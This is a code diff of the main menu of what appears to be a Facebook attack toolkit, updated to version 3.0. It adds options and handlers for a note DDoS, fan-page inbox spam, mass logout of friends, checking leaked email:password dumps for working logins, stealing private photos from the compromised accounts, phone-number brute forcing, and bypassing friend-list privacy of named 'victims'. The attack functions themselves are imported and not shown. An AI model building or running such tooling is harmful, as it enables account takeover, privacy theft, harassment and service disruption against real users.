@@ -1,9 +1,10 @@
-from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts 
-from database import connect,status
+from mainFunc import privateMessageLink,sendRequestToList,setGlobalLogginng ,reAnalyzeGraph,analyzeGraph,bypassFriendshipPrivacyPlot,massLogin,acceptRequest,friendshipRequest,like,appMessageSpoof,setMail,login,linkPreviewYoutube,linkPreview,hijackVideo, privateMessagePhishing, bypassFriendshipPrivacy, linkFriends, createUser, deleteUser,deleteAccounts, checkPrivacy, friendshipPlot, simpleGraph, dotFile, simpleDotGraph, noteDDoS, likeDev, devTest, getTest, changePassword,massMessage, massLoginTest, plotDOT, dotFileDatabase, simpleDotGraphDatabase, friendlyLogout, takePhotos,accountexists, checkLogin,steal, bruteforceCel
+from database import connect,status, checkTableExistence, createVictimTable
 from time import time
 import signal
 from handlers import *
 from sys import stdin
+import os
 
 globalLogin = False
 globalEmail = ''
@@ -25,12 +26,12 @@ def main():
     print '                   |  __| |  _ <|  __  |  | |     '
     print '                   | |    | |_) | |  | |  | |     '
     print '                   |_|    |____/|_|  |_|  |_|     '
-    print '                             ___    ___           '
-    print '                            |__ \  / _ \          '
-    print '                       __   __ ) || | | |         '
-    print '                       \ \ / // / | | | |         '
-    print '                        \ V // /_ | |_| |         '
-    print '                         \_/|____(_\___/          '
+    print '                             ____   ___           '
+    print '                            |___ \ / _ \          '
+    print '                       __   ____) | | | |         '
+    print '                       \ \ / /__ <| | | |         '
+    print '                        \ V /___) | |_| |         '
+    print '                         \_/|____(_)___/          '
     
     print '               _     _                                             '
     print '    ____      | |   (_)                                            '
@@ -56,7 +57,13 @@ def main():
                (int(option) != 15) and (int(option) != 16) and 
                (int(option) != 17) and (int(option) != 18) and
                (int(option) != 19) and (int(option) != 20) and
-               (int(option) != 21) and (int(option) != 22)):
+               (int(option) != 21) and (int(option) != 22) and 
+               (int(option) != 23) and (int(option) != 24) and
+               (int(option) != 25) and (int(option) != 26) and
+               (int(option) != 27) and (int(option) != 28) and
+               (int(option) != 29) and (int(option) != 30) and
+               (int(option) != 31) and (int(option) != 32) and
+               (int(option) != 33)):
                         
             print '\n'
             print '1)  Create accounts\n'
@@ -69,7 +76,7 @@ def main():
             print '8)  Youtube hijack\n'
             print '9)  Private message, Link Preview hack (Simple web version)\n'
             print '10) Private message, Link Preview hack (Youtube version)\n'
-            print '11) Like flood\n'
+            print '11) NEW Like flood\n'
             print '12) Publish a post as an App (App Message Spoof)\n'
             print '13) Bypass friendship privacy\n'
             print '14) Bypass friendship privacy with graph support\n'
@@ -80,7 +87,19 @@ def main():
             print '19) Set global login (Credentials stored in memory - Danger)\n'
             print '20) Print dead attacks :\'( \n'
             print '21) Send friend request to disclosed friend list from your account\n'
-            print '22) Close the application\n'
+            print '22) Bypass friendship (only .dot without graph integration)\n'
+            print '23) Note DDoS attack\n'
+            print '24) Old Like Flood (Not working)\n'
+            print '25) NEW! SPAM any fanpage inbox\n'
+            print '26) Bypass - database support (Beta) \n '
+            print '27) Logout all your friends - FB blackout \n'
+            print '28) Take the photos!\n'
+            print '29) Check existence of mails\n'
+            print '30) Check working account and passwords\n'
+            print '31) Steal private photos from password verified dump\n'
+            print '32) Bruteforce celphones\n'
+            print '33) Close the application\n'
+
             
             choice = raw_input('Insert your choice: ')
             
@@ -97,20 +116,16 @@ def main():
             else:
                 email = globalEmail
                 password = globalPassword
-
+            
+            appID = raw_input('Enter Application ID: ')
+            
             if (login(email,password,'real'))!= -1:
-                while True:
-                    number = raw_input('Insert the amount of accounts for creation (Must be less of 10): ')
-                    if int(number) <= 10:
-                        break
-                sTime = time()
-                                
-                if (createUser(number) == -1):
-                    raw_input('Apparently your test account list is full, try deleting first')
-                else:
-                    print '\n'
-                    raw_input('Execution time : %d' %(time() - sTime) + '\nPress Enter to continue: ')
-    
+                number = raw_input('Insert the amount of accounts for creation (4 min): ')
+                for i in range(int(number)/4):
+                    sTime = time()
+                    devTest(appID)
+                getTest(appID)
+               
     
         if(int(option) == 2):
             if (globalLogin == False):
@@ -140,9 +155,16 @@ def main():
             raw_input('Execution time : %d' %(time() - sTime) + '\nPress Enter to continue:')
             
         if(int(option) == 5):
-            sTime = time()
-            massLogin()
-            raw_input('Execution time : %d' %(time() - sTime) + '\nPress Enter to continue:')
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+                
+            if (login(email,password,'real'))!= -1:
+                sTime = time()
+                massLoginTest()
+                raw_input('Execution time : %d' %(time() - sTime) + '\nPress Enter to continue:')
 
         if (int(option) == 6):
             
@@ -205,7 +227,7 @@ def main():
                     videoID = raw_input('Insert the video ID (watch?v=): ')
                     comment = raw_input('Insert a comment for the post associated to the video: ')
                     hijackedVideo = raw_input('Insert the ID for the hijacked video (watch?v=): ')
-                    hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo)
+                    hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo,privacy[option])
                 else:
                     print "Wrong privacy value, try again "
 
@@ -257,7 +279,7 @@ def main():
                 counter = 0
                 postId = []
                 
-                print 'Insert the Post ID\'s (Must be from a page). If no more posts for adding,insert \'0\' :'
+                print "Insert the Post ID's (Must be from a page). If no more posts for adding,insert '0' :"
                 while True:
                     response = raw_input('post[%d]:'%counter)
                     if ( response is not '0' ):
@@ -265,16 +287,15 @@ def main():
                         postId.append(response)
                     else:
                         break
-                
-                quantity = raw_input('Insert the amount of likes: ')
-                like(postId, quantity)
+                        
+                likeDev(postId)
             except EOFError:
                 print 'EOFError'
                 stdin.flush()
                 pass
             except signalCaught as e:
                 print ' %s' %e.args[0]  
-                raw_input('Press enter to continue..')
+
                     
         
         if (int(option) == 12):
@@ -308,7 +329,8 @@ def main():
             if (login(email,password,'real'))!= -1:
                 victim = raw_input('Insert the victim username or userId: ')
                 transitive = raw_input('Insert the transitive username or userId: ')
-                print 'The information will be stored in dumps\\%s.txt \n' %victim
+                
+                print "The information will be stored in %s. \n" % os.path.join("dumps",victim+".txt")
                 bypassFriendshipPrivacy(victim, transitive)
         
         if (int(option) == 14):
@@ -322,9 +344,15 @@ def main():
 
             if (login(email,password,'real'))!= -1:
                 victim = raw_input('Insert the victim username or userId: ')
-                transitive = raw_input('Insert the transitive username or userId: ')
-                print 'The information will be stored in dumps\\%s\\%s.txt \n' %(victim,victim)
-                bypassFriendshipPrivacyPlot(victim, transitive)
+                check = checkPrivacy(victim)
+                if (check == -1):
+                    transitive = raw_input('Insert the transitive username or userId: ')
+                    print 'The information will be stored in %s \n' % os.path.join("dumps",victim,victim+".txt")
+                    bypassFriendshipPrivacyPlot(victim, transitive)
+                else:
+                    friendList, friendsName = friendshipPlot(check,victim)
+                    simpleGraph(friendList, victim)
+                    print 'Friends available public ;D'
 
         
         if (int(option) == 15):
@@ -392,9 +420,157 @@ def main():
                     sendRequestToList(victim)
         
 
-        
         if (int(option) == 22):
-            connect.close()
+            signal.signal(signal.SIGINT, signal_handler)
+
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+
+            if (login(email,password,'real'))!= -1:
+                victim = raw_input('Insert the victim username or userId: ')
+                check = checkPrivacy(victim)
+                if (check == -1):
+                    transitive = raw_input('Insert the transitive username or userId: ')
+                    print 'The information will be stored in %s \n' % os.path.join("dumps",victim,victim+".txt")
+                    dotFile(victim, transitive)
+                else:
+                    print 'Friends publicly available ;D'
+                    friendList, friendsName = friendshipPlot(check,victim)
+                    simpleDotGraph(friendsName, victim)
+
+        if (int(option) == 23):
+            signal.signal(signal.SIGINT, signal_handler)
+            print 'Facebook note DDoS attack, discovered by chr13: http://chr13.com/about-me/'
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+
+            if (login(email,password,'real'))!= -1:
+                raw_input('Usage: First you must create an empty note. Once your note is created, write down the note ID number from the URL. ENTER TO CONTINUE...')
+                imageURL = raw_input('Insert the image URL from the site attack: ')
+                noteID = raw_input('Insert the note ID: ')
+                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
+                if option in privacySet:
+                    noteDDoS(imageURL,noteID, privacy[option])
+        
+
+                    
+        if (int(option) == 24):
+            signal.signal(signal.SIGINT, signal_handler)
+            try:
+                counter = 0
+                postId = []
+                
+                print 'Insert the Post ID\'s (Must be from a page). If no more posts for adding,insert \'0\' :'
+                while True:
+                    response = raw_input('post[%d]:'%counter)
+                    if ( response is not '0' ):
+                        counter+=1
+                        postId.append(response)
+                    else:
+                        break
+                
+                quantity = raw_input('Insert the amount of likes: ')
+                like(postId, quantity)
+            except EOFError:
+                print 'EOFError'
+                stdin.flush()
+                pass
+            except signalCaught as e:
+                print ' %s' %e.args[0]  
+                raw_input('Press enter to continue..')
+                
+   
+        if (int(option) == 25):
+            page = raw_input('Insert the fan page name or id: ')
+            message = raw_input('Insert the message to send: ')
+            massMessage(page, message)
+
+        if (int(option) == 26):
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword             
+            if (login(email,password,'real'))!= -1:
+                victim = raw_input('Insert the victim username or userId: ')
+                if ( checkTableExistence(victim) != True):
+                    if (createVictimTable(victim) != -1):
+                        check = checkPrivacy(victim)
+                        if (check == -1):
+                            transitive = raw_input('Insert the transitive username or userId: ')
+                            dotFileDatabase(victim, transitive)
+                            plotDOT(victim)    
+                        else:
+                            print 'Friends publicly available ;D'
+                            friendList, friendsName = friendshipPlot(check,victim)
+                            simpleDotGraphDatabase(friendsName, victim)
+                            plotDOT(victim)
+
+        if (int(option) == 27):
+            signal.signal(signal.SIGINT, signal_handler)
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+
+            if (login(email,password,'real'))!= -1:
+                raw_input('Usage: First you must create an empty note. Once your note is created, write down the note ID number from the URL. ENTER TO CONTINUE...')
+                noteID = raw_input('Insert the note ID: ')
+                option = raw_input("Insert option for privacy 0:Public 1:Friends 2:Only Me : ")
+                if option in privacySet:
+                    friendlyLogout(noteID, privacy[option])
+
+        if (int(option) == 28):
+            signal.signal(signal.SIGINT, signal_handler)
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+
+            if (login(email,password,'real'))!= -1:
+                threads = raw_input('Usage: insert the threads filename and place it in massive folder first: ')
+                raw_input('Dumps will be stored in massive\\photos')
+                takePhotos(threads)
+
+        if (int(option) == 29):
+            mailFile = raw_input('Insert the filename that contains the list of emails (place it in PRIVATE folder first): ')
+            raw_input('Verified emails will be stored in PRIVATE --> existence --> verified.txt ')
+            accountexists(mailFile)
+            
+        if (int(option) == 30):
+            mailFile = raw_input('Insert the filename that contains the list of emails and passwords (place it in PRIVATE folder first) with email:password pattern: ')
+            raw_input('Verified loggins will be stored in PRIVATE --> loggedin --> loggedin.txt ')
+            checkLogin(mailFile)
+
+        if (int(option) == 31):
+            raw_input('You must first run option 30, if you didn\'t I will fail :D ')
+            raw_input('Dumps will be stored in massive\\photos')
+            steal()
+
+        if (int(option) == 32):
+            signal.signal(signal.SIGINT, signal_handler)
+            if (globalLogin == False):
+                email,password = setMail()
+            else:
+                email = globalEmail
+                password = globalPassword
+            if (login(email,password,'real'))!= -1:
+                raw_input('Dumps will be stored in cellphones --> cellphones.txt')
+                first = raw_input('Insert the zone code: ')
+                start = raw_input('Insert the start number: ')
+                end = raw_input('Insert the end number: ')
+                bruteforceCel(first,start,end)  
+            
+        if (int(option) == 33):
+            connect.close()          
             
             print '\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n \n \n\n \n \n \n '                        
             print ' _    _            _      _______ _            _____  _                  _   _  '
